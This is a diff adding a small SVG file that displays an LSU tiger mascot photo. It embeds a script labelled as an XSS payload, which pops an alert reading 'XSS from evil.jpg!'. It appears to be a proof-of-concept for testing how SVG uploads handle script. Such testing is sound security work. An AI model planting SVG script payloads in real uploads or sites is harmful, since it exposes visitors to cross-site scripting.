@@ -1,0 +1,9 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
+  <!-- Optional real image -->
+  <image href="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Mike_the_Tiger_LSU.jpg/640px-Mike_the_Tiger_LSU.jpg"
+         width="300" height="300"/>
+  <!-- XSS payload -->
+  <script>
+    alert('XSS from evil.jpg!');
+  </script>
+</svg>
